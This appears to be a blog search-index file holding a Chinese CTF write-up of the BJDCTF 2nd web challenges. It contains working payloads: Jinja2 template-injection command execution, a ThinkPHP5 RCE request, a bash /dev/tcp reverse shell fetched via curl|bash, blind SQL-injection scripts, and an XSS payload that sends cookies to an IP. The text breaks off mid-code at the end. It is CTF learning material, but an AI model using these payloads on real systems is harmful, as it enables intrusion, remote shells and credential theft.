<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJD2nd--Web</title>
    <url>/2020/03/24/BJD2nd-Web/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr>
<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p><img src="https://img-blog.csdnimg.cn/20200324115818172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过测试，存在xss和模板注入，这题是模板注入<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考文献</a></p>
<hr>
<a id="more"></a>
<p><img src="https://img-blog.csdnimg.cn/20200325094541155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p>&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。<br>可以发现是存在这个类的<br><img src="https://img-blog.csdnimg.cn/2020032412004079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来用脚本跑索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D;&quot;http:&#x2F;&#x2F;67a8fe61-a3c7-42f4-85ae-f8e301bd7f30.node3.buuoj.cn&#x2F;qaq&quot;</span><br><span class="line">temp&#x3D;&#123;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;537306c0-5737-4a8b-8db5-8fd5c2362b4f.node3.buuoj.cn&#x2F;qaq?name&#x3D;&#123;&#123;\&quot;\&quot;.__class__.__bases__[0].__subclasses__()[%d]&#125;&#125;&quot; % i</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    print (url)</span><br><span class="line">    print(r.text)</span><br><span class="line">    if &quot;os._wrap_close&quot; in r.text:</span><br><span class="line">        print(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>索引是117<br>接下来测试看看能不能命令执行<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls &#x2F;&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200324120402833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功查看根目录下文件，可以发现flag文件在根目录下，查看即可</p>
<p>网上看到的第二个方法(其实就是写个python进去找索引,emmm,对于现在的我来说可能想不到这种注入，只能写脚本跑了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%27&#39;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<br>
<br>




<hr>
<h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><p><img src="https://img-blog.csdnimg.cn/2020032418425620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>题目已提示是thinkphp5，自行去搜thinkphp5的漏洞，会找到对应版本，<br><a href="https://www.ebounce.cn/web/thinkphp-rce.html" target="_blank" rel="noopener">参考文献</a></p>
<p>根据参考文献<br>可得出payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get请求</span><br><span class="line">s&#x3D;captcha</span><br><span class="line">post请求</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200324184718643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看根目录下的flag即可<br><br><br><br></p>
<hr>
<h1 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h1><p><img src="https://img-blog.csdnimg.cn/20200324223518233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>题目已提示是swp备份文件泄露<br>.index.php.swp 即可拿到备份源码<br>vim -r 打开 解析即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emmmmm，过滤了很多东西，当时做到这无从下手，只能看web了,新知识，反弹shell，在buu上因为内网的原因，这题需要用内网开linux靶机，弄了比较长的时间<br><a href="https://www.cnblogs.com/Konmu/p/12549038.html" target="_blank" rel="noopener">参考文献</a></p>
<p>因为exec()不会回显（之前一直琢磨怎么让他回显。。。）反弹shell能够解决而且又没有过滤curl。<br>先在/var/www/html，创建一个shell.txt文件<br>输入的命令为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>ip 为内网主机的ip地址，port为端口，随便输(这里以端口为2333为例)</p>
<p>再传post值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;内网ip&#x2F;shell.txt|bash</span><br></pre></td></tr></table></figure>

<p>再nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
<p>学到一个新指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name flag</span><br></pre></td></tr></table></figure>

<p>找到flag所在目录查看即可</p>
<hr>
<h1 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h1><p><img src="https://img-blog.csdnimg.cn/20200325143901630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先先测试看看他过滤了啥<br><img src="https://img-blog.csdnimg.cn/2020032514404765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现过滤了以下指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union , select , &#x3D; , &#39; , &amp; , &amp;&amp; , - ,  &quot; , and</span><br></pre></td></tr></table></figure>
<p>(当时看到分号被过滤了，顿时不想做了)</p>
<p>首先联合注入不可取的，试了试了报错注入，没有报错回显</p>
<p>考虑盲注（我构造的盲注语句好像不行，只能看web了）</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h2><p>新知识（正则表达式注入）<br>            <a href="http://www.freesion.com/article/2367234678/" target="_blank" rel="noopener">参考文献</a><br>由于过滤了双引号，新东西：<br>BINARY 运算符将紧随其后的 string 转换为 二进制字符串<br>好像用二分法跑比较麻烦，只能遍历了。。。。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D;&quot;http:&#x2F;&#x2F;b688f906-6a48-48c8-af28-74052e3b3905.node3.buuoj.cn&quot;</span><br><span class="line">temp&#x3D;&#123;&#125;</span><br><span class="line">password &#x3D;&quot;&quot;</span><br><span class="line">string &#x3D; [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;]</span><br><span class="line">a &#x3D; &#39;0x5e&#39;</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    for j in string:</span><br><span class="line">        str &#x3D; hex(j).replace(&#39;0x&#39;, &#39;&#39;)</span><br><span class="line">        # 查用户名</span><br><span class="line">        username &#x3D; &quot;or username regexp binary %s #&quot; % (a + str)</span><br><span class="line">        print(username)</span><br><span class="line">        data &#x3D; &#123;&quot;username&quot;: &quot;\\&quot;, &quot;password&quot;: username&#125;</span><br><span class="line">        # 查密码</span><br><span class="line">        #payload &#x3D; &quot;or password regexp binary %s #&quot; % (a + str) </span><br><span class="line">        #print(payload)</span><br><span class="line">        #data&#x3D;&#123;&quot;username&quot; :&quot;\\&quot;,&quot;password&quot; : payload &#125;</span><br><span class="line">        r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">        #print(r.text)</span><br><span class="line">        if &quot;BJD needs to be stronger&quot; in r.text:</span><br><span class="line">            password +&#x3D;chr(j)</span><br><span class="line">            print(password)</span><br><span class="line">            a+&#x3D;str</span><br><span class="line">            break</span><br><span class="line">    if &quot;You konw ,P3rh4ps needs a girl friend&quot; in r.text:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
<p>根据上面的查询到用户名以及密码，直接登录即可</p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h2><p>转义单引号<br><img src="https://img-blog.csdnimg.cn/20200325154655319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以发现password逃逸出去了</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;or 1 #&amp;username&#x3D;admin\</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200325154942369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入进去可以发现下面的回显不一样了<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;^ (ascii(substr((password),1,1))&gt;1)#&amp;username&#x3D;admin\</span><br></pre></td></tr></table></figure>
<p>可以直接异或，长知识了</p>
<p>接下来上脚本:(二分法跑)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;aed2ff9b-a59f-4192-94ce-362ee82b9d30.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">temp &#x3D; &#123;&#125;</span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    high &#x3D;128</span><br><span class="line">    mid &#x3D; (low+high)&#x2F;&#x2F;2</span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        payload &#x3D; &#39;^ (ascii(substr((password),%d,1))&gt;%d)#&#39; % (i,mid)</span><br><span class="line">        temp&#x3D;&#123;&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;: payload&#125;</span><br><span class="line">        r &#x3D; requests.post(url,data&#x3D;temp)</span><br><span class="line">        print(low,high,mid,&quot;:&quot;)</span><br><span class="line">        if &quot;P3rh4ps&quot; in r.text:</span><br><span class="line">            low &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    if(mid &#x3D;&#x3D;32 or mid &#x3D;&#x3D;127):</span><br><span class="line">        break</span><br><span class="line">    password +&#x3D;chr(mid)</span><br><span class="line">    print(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;password&#x3D;&quot;,password)</span><br></pre></td></tr></table></figure>
<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>时间盲注，<br><a href="https://blog.csdn.net/qq_42967398/article/details/105064546?fps=1&locationNum=2" target="_blank" rel="noopener">csdn参考文献</a></p>
<hr>
<blockquote>
<p><strong>[BJDCTF 2nd]假猪套天下第一</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200325163119870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>刚开始以为是sql注入，后来抓包的时候看到了隐藏文件（访问源代码也可以）<br><img src="https://img-blog.csdnimg.cn/20200325163413617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有个 L0g1n.php的页面，进去看看，记得刷新一下页面<br><img src="https://img-blog.csdnimg.cn/2020032516380124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要我们呢修改时间，放到burp中，<br>看到cookie里有个time的值，修改后<br><img src="https://img-blog.csdnimg.cn/20200325163913735.png" alt="在这里插入图片描述"><br>要从本地访问，有三种X-Forwarded-For,X-Forwarded-Host,CLIENT-IP,host<br>这里只能用CLIENT-IP或者X-Real-IP<br>剩下的不说了，就按照提示来就行了，改http头就行<br><a href="https://www.cnblogs.com/benbenfishfish/p/5821091.html" target="_blank" rel="noopener">参考文献</a><br>这里要说下Commodo 64这个浏览器，谷歌搜索<br><img src="https://img-blog.csdnimg.cn/20200325164923715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>真正的名字是 Commodore 64<br>最后的http头如下<br><img src="https://img-blog.csdnimg.cn/20200325165123557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解密即可</p>
<hr>
<h1 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h1><p>这题脑洞太大了<br><a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection" target="_blank" rel="noopener">自行参考</a></p>
<hr>
<h1 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h1><p><img src="https://img-blog.csdnimg.cn/20200326111726374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>用kali自带的dirb扫描目录，发现是.git泄露<br>使用githack得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>

<p>没有类的情况下，可以进行原生类反序列化<br>这题可以使用__toString进行构造<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2" target="_blank" rel="noopener">参考文献</a><br>可以使用Exception</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>赵老板赛后应该改了一下源码，这段js，我看别的web试出来了。<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; serialize(new Exception(&quot;&lt;script&gt;window.location.href&#x3D;&#39;IP&#39;+document.cookie&lt;&#x2F;script&gt;&quot;));</span><br><span class="line">echo urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>返回抓包的时候发现弹出cookie<br><img src="https://img-blog.csdnimg.cn/20200326111653406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h1><p>脑洞题</p>
<p>查看源代码，发现id的值不太对劲，进行十六进制转字符是<br>Po.php进去之后啥都没有，看看图片，提到了放射性元素，Po刚好是化学元素<br><img src="https://img-blog.csdnimg.cn/20200326170902194.png" alt="在这里插入图片描述"><br>可能要我们遍历化学元素。。。。<br>（据说这道题是美国的一道原题改的，还改简单了）</p>
<p>接下来上我的垃圾脚本，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">list &#x3D; [&#39;H&#39;, &#39;He&#39;, &#39;Li&#39;, &#39;Be&#39;, &#39;B&#39;, &#39;C&#39;, &#39;N&#39;, &#39;O&#39;, &#39;F&#39;, &#39;Ne&#39;, &#39;Na&#39;, &#39;Mg&#39;, &#39;Al&#39;, &#39;Si&#39;, &#39;P&#39;, &#39;S&#39;, &#39;Cl&#39;, &#39;Ar&#39;,&#39;K&#39;, &#39;Ca&#39;, &#39;Sc&#39;, &#39;Ti&#39;, &#39;V&#39;, &#39;Cr&#39;, &#39;Mn&#39;, &#39;Fe&#39;, &#39;Co&#39;, &#39;Ni&#39;, &#39;Cu&#39;, &#39;Zn&#39;, &#39;Ga&#39;, &#39;Ge&#39;, &#39;As&#39;, &#39;Se&#39;, &#39;Br&#39;, &#39;Kr&#39;, &#39;Rb&#39;, &#39;Sr&#39;, &#39;Y&#39;, &#39;Zr&#39;, &#39;Nb&#39;, &#39;Mo&#39;, &#39;Te&#39;, &#39;Ru&#39;, &#39;Rh&#39;, &#39;Pd&#39;, &#39;Ag&#39;, &#39;Cd&#39;, &#39;In&#39;, &#39;Sn&#39;, &#39;Sb&#39;, &#39;Te&#39;, &#39;I&#39;, &#39;Xe&#39;, &#39;Cs&#39;, &#39;Ba&#39;, &#39;La&#39;, &#39;Ce&#39;, &#39;Pr&#39;, &#39;Nd&#39;, &#39;Pm&#39;, &#39;Sm&#39;, &#39;Eu&#39;, &#39;Gd&#39;, &#39;Tb&#39;, &#39;Dy&#39;, &#39;Ho&#39;, &#39;Er&#39;, &#39;Tm&#39;, &#39;Yb&#39;, &#39;Lu&#39;, &#39;Hf&#39;, &#39;Ta&#39;, &#39;W&#39;, &#39;Re&#39;, &#39;Os&#39;, &#39;Ir&#39;, &#39;Pt&#39;, &#39;Au&#39;, &#39;Hg&#39;, &#39;Tl&#39;, &#39;Pb&#39;, &#39;Bi&#39;, &#39;Po&#39;, &#39;At&#39;, &#39;Rn&#39;, &#39;Fr&#39;, &#39;Ra&#39;, &#39;Ac&#39;, &#39;Th&#39;, &#39;Pa&#39;, &#39;U&#39;, &#39;Np&#39;, &#39;Pu&#39;, &#39;Am&#39;, &#39;Cm&#39;, &#39;Bk&#39;, &#39;Cf&#39;, &#39;Es&#39;, &#39;Fm&#39;,&#39;Md&#39;, &#39;No&#39;, &#39;Lr&#39;, &#39;Rf&#39;, &#39;Db&#39;, &#39;Sg&#39;, &#39;Bh&#39;, &#39;Hs&#39;, &#39;Mt&#39;, &#39;Ds&#39;, &#39;Rg&#39;, &#39;Cn&#39;, &#39;Nh&#39;, &#39;Fl&#39;, &#39;Mc&#39;, &#39;Lv&#39;, &#39;Ts&#39;, &#39;Og&#39;, &#39;Uue&#39;]</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;4feb057d-dd21-4ed6-ace9-bba56434aebd.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">t &#x3D;&quot; &quot;</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    i+&#x3D;&quot;.php&quot;</span><br><span class="line">    print(i)</span><br><span class="line">    url&#x3D; url+i</span><br><span class="line">    print(url)</span><br><span class="line">    print(&#39;\n&#39;)</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        t +&#x3D; r.text</span><br><span class="line">        print(t)</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;4feb057d-dd21-4ed6-ace9-bba56434aebd.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">print(t)</span><br><span class="line"></span><br><span class="line">print(url+t)</span><br></pre></td></tr></table></figure>

<p>跑出来后<br><img src="https://img-blog.csdnimg.cn/20200326171438400.png" alt="在这里插入图片描述"><br>进入链接即可</p>
<hr>
<h1 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h1><p>代码审计题，<br>刚开始我用kali的dirb扫描到<br>admin.php 和 robots.txt两个目录<br>进入到admin.php<br><img src="https://img-blog.csdnimg.cn/20200327110752143.png" alt="在这里插入图片描述"></p>
<p>以为是改http头，不可取</p>
<p>回过头来看源代码</p>
<p><img src="https://img-blog.csdnimg.cn/2020032710440983.png" alt="在这里插入图片描述"></p>
<p>这里已经提示，抓包在响应头看到hint,有个home.php，访问进去看看<br>观察他的url<br><img src="https://img-blog.csdnimg.cn/20200327104557817.png" alt="在这里插入图片描述"></p>
<p>存在文件包含，读取到system 的源码<br>重要代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第一个q1不用管，没有任何过滤</p>
<p>看到q2 的过滤，基本上可以看出这是个SSRF了，但是后面会被加上y1ng.txt的后缀</p>
<p>再看到q3，</p>
<p>必须得有 GET 或者 POST 开头</p>
<p><a href="https://www.ixuchao.cn/xuchaoa/2018/03/18/sprintf%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">sprintf()格式化注入漏洞参考文献</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect))</span><br></pre></td></tr></table></figure>
<p>因为%d整形输出，我们要以字符型输出(%s)才能看到admin,php的代码，利用sprintf()漏洞<br>%%   将%吞掉，d就没用了</p>
<p>前面再加个%s,就可以通过file_get_contents函数输出admin.php的代码了</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q1&#x3D;fuckyou&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?q&#x3D;1&amp;q3&#x3D;GET%s%</span><br></pre></td></tr></table></figure>
<p>得到admin.php 的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) 